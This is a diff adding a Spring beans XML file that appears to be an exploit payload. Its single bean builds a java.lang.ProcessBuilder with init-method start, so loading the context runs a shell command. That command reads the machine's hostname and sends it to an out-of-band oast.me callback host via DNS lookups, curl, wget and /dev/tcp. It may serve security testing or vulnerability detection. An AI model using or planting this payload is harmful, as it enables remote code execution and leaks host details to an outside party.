@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>/bin/sh</value>
+        <value>-c</value>
+        <value>H=$(hostname); getent hosts "$H.x.dbd2e6b332t3cvourda0xg8usrwf443tn.oast.me" >/dev/null 2>&1; nslookup "$H.y.dbd2e6b332t3cvourda0xg8usrwf443tn.oast.me" >/dev/null 2>&1; curl -s -m 5 "http://$H.z.dbd2e6b332t3cvourda0xg8usrwf443tn.oast.me/" >/dev/null 2>&1; wget -qO- -T 5 "http://$H.w.dbd2e6b332t3cvourda0xg8usrwf443tn.oast.me/" >/dev/null 2>&1; echo x > /dev/tcp/dbd2e6b332t3cvourda0xg8usrwf443tn.oast.me/80 2>/dev/null; true</value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
